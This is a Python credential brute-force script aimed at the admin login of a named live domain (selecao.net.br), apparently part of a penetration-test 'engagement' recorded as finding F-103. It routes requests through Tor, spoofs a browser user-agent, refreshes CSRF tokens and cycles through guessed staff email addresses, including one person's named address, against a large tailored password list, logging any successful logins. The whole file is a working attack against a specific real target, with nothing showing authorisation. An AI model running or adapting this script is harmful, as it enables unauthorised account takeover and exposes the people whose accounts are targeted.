#!/usr/bin/env python3
import requests, urllib3, re, json, time, sys, os

urllib3.disable_warnings()
OUTPUT = "/home/ubuntu/engagement/cotec-fadenor.selecao.net.br/evidence/F-103_bruteforce_admin.txt"
base = "https://ifes25-semproxy.selecao.net.br"
DOMAIN = "selecao.net.br"

s = requests.Session()
s.verify = False
s.proxies = {"https": "socks5://127.0.0.1:9050", "http": "socks5://127.0.0.1:9050"}
s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})

def get_token():
    r = s.get(f"{base}/admin/login/", timeout=30)
    m = re.search(r'name="_token" value="([a-zA-Z0-9_-]+)"', r.text)
    return m.group(1) if m else None

# Priority: most likely admin users
users = [
    "gustavo@impactaweb.com.br",
    "admin@selecao.net.br",
    "cotec@selecao.net.br",
    "fadenor@selecao.net.br",
    "proseleta@selecao.net.br",
    "suporte@selecao.net.br",
    "gestao@selecao.net.br",
    "painel@selecao.net.br",
    "coordenador@selecao.net.br",
    "secretaria@selecao.net.br",
    "superadmin@selecao.net.br",
    "master@selecao.net.br",
    "rh@selecao.net.br",
    "ifes@selecao.net.br",
    "instituto@selecao.net.br",
    "selecao@selecao.net.br",
    "adm@selecao.net.br",
    "administrador@selecao.net.br",
    "root@selecao.net.br",
    "impacta@selecao.net.br",
    "admin@cotec.com.br",
    "admin@ifes.edu.br",
]

passwords = [
    # Top 20 - most common/default
    "admin", "123456", "admin123", "selecao", "proseleta",
    "ProSeleta", "cotec2023", "fadenor2023", "impacta2023",
    "@dmin2023", "password", "12345678", "senha", "senha123",
    "ifes2023", "cotec2024", "proseleta2024", "impactaweb", "gustavo",
    "admin2024", "Admin123", "Admin@123", "administrador",
    "selecao2024", "processoseletivo", "Proseleta@2023",
    "Cotec2023!", "Fadenor@2024", "selecao.net.br", "adminifes",
    # More variations
    "Impacta2023", "Proseleta@2023", "Cotec2023!", "Fadenor@2024",
    "cotec@2023", "fadenor@2023", "proseleta@2023", "impacta@2023",
    "senh@123", "adm2023", "adm2024", "COTEC", "FADENOR", "PROSELETA",
    "admin@123", "Admin@1234", "P@ssw0rd", "p@ssw0rd",
    "cotec2025", "fadenor2025", "Cotec@2023", "Fadenor@2023",
    "impacta2024", "impacta@2024", "Proseleta2023", "proseleta2023",
    "COTEC2023", "FADENOR2023", "PROSELETA2023", "impactaweb@2023",
    "gustavo@2023", "gustavo123", "impacta@123", "cotec@123",
    "fadenor@123", "ProSeleta2023", "ProSeleta2024", "C0t3c2023",
    "F4d3n0r2023", "1mpacta2023",
    "cotec@2024", "fadenor@2024", "impacta@2024",
    "ProSeleta@2024", "Proseleta@2024",
    "@dmin2024", "Admin2023", "admin2023",
    "selecao123", "Selecao123", "Selecao2023",
    "ProSeleta@2023", "proseleta@2024",
    "gustavo1234", "Gustavo@2023", "Gustavo2023",
    # Common patterns
    "teste", "teste123", "welcome", "letmein", "monkey", "dragon",
    "master", "1234", "12345", "qwerty", "abc123", "654321",
    "000000", "111111", "222222", "333333", "444444", "555555",
    "666666", "777777", "888888", "999999",
    "123456789", "1234567890", "102030", "020202",
    "gestao", "painel", "suporte",
    "cotecadmin", "admincotec", "fadenoradmin",
    "selecao@123", "Selecao@123", "Cotec@2024", "Fadenor@2025",
]

log = []
found = False
total = 0

print("=== F-103 Brute Force Admin === "
      f"[{len(users)} users x {len(passwords)} passwords = {len(users)*len(passwords)} attempts]")

token = get_token()
if not token:
    print("[FATAL] No CSRF token")
    sys.exit(1)

for user in users:
    if found:
        break
    for pwd in passwords:
        total += 1
        try:
            r = s.post(f"{base}/admin/login/",
                       json={"email": user, "password": pwd},
                       headers={"X-CSRF-TOKEN": token, "Accept": "application/json"},
                       timeout=30, allow_redirects=False)
            
            status = r.status_code
            body = r.text
            sz = len(body)

            if status == 302:
                loc = r.headers.get("Location","")
                log.append(f"[{total:4d}] ✅ {user}:{pwd} -> 302 Location: {loc}")
                found = user
                break
            
            if status == 200:
                bl = body.lower()
                if "dashboard" in bl or "painel" in bl or "admin" in bl:
                    log.append(f"[{total:4d}] ✅ {user}:{pwd} -> 200 (dashboard/painel)")
                    found = user
                    break
                try:
                    j = json.loads(body)
                    if j.get("success") or j.get("token") or j.get("access_token"):
                        log.append(f"[{total:4d}] ✅ {user}:{pwd} -> 200 (json success)")
                        found = user
                        break
                except:
                    pass
                if "errors" not in bl and "invalid" not in bl and "erro" not in bl:
                    log.append(f"[{total:4d}] ✅ {user}:{pwd} -> 200 (no errors)")
                    found = user
                    break

            if status == 419:
                log.append(f"[{total:4d}] CSRF expired, refreshing...")
                token = get_token()
                if not token:
                    log.append("[FATAL] CSRF refresh failed")
                    break
                # Retry same attempt
                r = s.post(f"{base}/admin/login/",
                           json={"email": user, "password": pwd},
                           headers={"X-CSRF-TOKEN": token, "Accept": "application/json"},
                           timeout=30, allow_redirects=False)
                status = r.status_code
                if status == 302:
                    log.append(f"[{total:4d}] ✅ {user}:{pwd} -> 302 (após refresh)")
                    found = user
                    break

            if total % 50 == 0:
                log.append(f"[{total:4d}] progress: last={user}:{pwd} -> {status}")
                sys.stdout.write(f"\rProgress: {total}/{len(users)*len(passwords)} attempts...")
                sys.stdout.flush()

        except Exception as e:
            log.append(f"[{total:4d}] ERROR {user}:{pwd} -> {e}")
            time.sleep(2)

        time.sleep(0.15)

# Write output
with open(OUTPUT, "w") as f:
    f.write("# F-103 Brute Force Admin\n")
    f.write(f"Alvo: {base}/admin/login/\n")
    f.write(f"Timestamp: {time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())}\n")
    f.write(f"Severidade: Crítica\n\n")
    f.write("## Resultados\n\n")
    if found:
        for l in log:
            if "✅" in l:
                f.write(f"{l}\n")
                print(f"\n{l}")
    else:
        f.write("Nenhuma credencial encontrada.\n")
    f.write(f"\n## Estatísticas\n")
    f.write(f"Total de tentativas: {total}\n")
    f.write(f"Usuários testados: {len(users)}\n")
    f.write(f"Senhas testadas: {len(passwords)}\n\n")
    f.write("## Log de tentativas\n\n")
    for l in log:
        f.write(l + "\n")

print(f"\n\n=== RESULTADO FINAL ===")
if found:
    print(f"✅ Credencial encontrada! Ver {OUTPUT}")
else:
    print(f"❌ Nenhuma credencial encontrada após {total} tentativas")
print(f"Log completo: {OUTPUT}")
print(f"End: {time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())}")